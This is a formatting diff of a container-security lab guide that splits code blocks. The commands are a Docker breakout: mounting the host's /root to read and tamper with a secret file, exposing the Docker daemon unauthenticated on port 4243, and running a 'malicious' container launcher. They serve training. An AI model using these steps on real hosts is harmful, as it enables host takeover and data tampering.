@@ -33,7 +33,8 @@ cat /root/secret.txt
 
 ```commandline
 sudo su we45
-
+```
+```commandline
 whoami
 ```
 
@@ -41,7 +42,8 @@ whoami
 
 ```commandline
 docker images
-
+```
+```commandline
 docker ps
 ```
 
@@ -65,7 +67,8 @@ docker run -ti --rm -v /root:/hostFS/ alpine sh
 
 ```commandline
 cat /hostFS/secret.txt
-
+```
+```commandline
 echo "Tampered data!!" >> /hostFS/secret.txt
 ```
 
@@ -111,9 +114,11 @@ ufw status
 
 ```commandline
 ufw enable
-
+```
+```commandline
 ufw allow ssh
-
+```
+```commandline
 ufw status
 ```
 
@@ -147,7 +152,8 @@ docker exec -ti <CONTAINER_ID> /bin/bash
 
 ```commandline
 apt update 
-
+```
+```commandline
 apt install -y ufw
 ```
 
@@ -161,7 +167,8 @@ ufw status
 
 ```commandline
 ufw disable
-
+```
+```commandline
 ufw status
 ```
 
@@ -201,7 +208,8 @@ cd /root/container-training/Container/container-breakout/
 
 ```
 tmux
-
+```
+```commandline
 tmux split-window -v
 ```
 
@@ -213,6 +221,8 @@ tmux split-window -v
 
 ```commandline
 command='while true\ndo\necho "Super important process running $$"\nsleep 3\ndone'
+```
+```commandline
 printf "$command" > super_important_process.sh && chmod +x super_important_process.sh
 ```
 
@@ -253,7 +263,8 @@ kill <PID>
 
 ```commandline
 exit
-
+```
+```commandline
 exit
 ```
 
@@ -287,9 +298,11 @@ cd /root/container-training/Container/container-breakout/
 
 ```commandline
 sed -i '/ExecStart/c\ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243' /lib/systemd/system/docker.service
-
+```
+```commandline
 systemctl daemon-reload
-
+```
+```commandline
 service docker restart
 ```
 
@@ -326,13 +339,17 @@ http://<IP>:4243/images/json
 
 ```commandline
 apt install -y virtualenv && export LC_ALL="en_US.UTF-8" && export LC_CTYPE="en_US.UTF-8"
-
+```
+```commandline
 virtualenv venv
-
+```
+```commandline
 source venv/bin/activate
-
+```
+```commandline
 pip install docker
-
+```
+```commandline
 python launch-malicious-docker.py
 ```
 
@@ -352,9 +369,10 @@ http://<IP>:6080/vnc.html
 
 ```commandline
 apt update && apt install -y kmod
-
+```
+```commandline
 lsmod
-``` 
+```
 
 -------
 
